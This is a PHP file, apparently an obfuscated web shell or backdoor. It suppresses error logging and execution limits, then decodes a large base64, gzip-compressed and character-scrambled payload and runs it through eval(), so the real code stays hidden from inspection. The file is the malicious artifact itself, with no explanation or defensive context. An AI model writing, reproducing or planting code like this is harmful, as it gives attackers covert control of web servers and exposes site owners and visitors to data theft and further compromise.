<?php
/* unknownsec1337@gmail.com */
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="kucx4B8RPsGUEFGamUySB40kx7HHsXdjj2E7+zawZgWIgAR4KILhRTNO/H7GO+zl/Yr+QXwC+kBCBx761DCwVdVNsklRHzPjrHdtYESxq6uqu+u7u3X/XipiOU7lVCy9eBwnc/kh8uWYy7hpP+KJ6P6buBRhLOzW6f17jbHPBsz+xb/0o4X/Rro2veTw0urz+NqTw1hM";
?>